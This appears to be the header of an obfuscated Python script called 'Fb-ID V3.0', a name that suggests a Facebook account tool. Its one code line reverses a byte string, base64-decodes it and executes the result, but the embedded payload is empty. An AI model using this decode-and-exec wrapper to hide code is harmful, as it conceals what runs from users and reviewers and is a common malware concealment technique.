# Created by MrUser#
#Fb-ID V3.0#
#Please subscribe to my account github#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))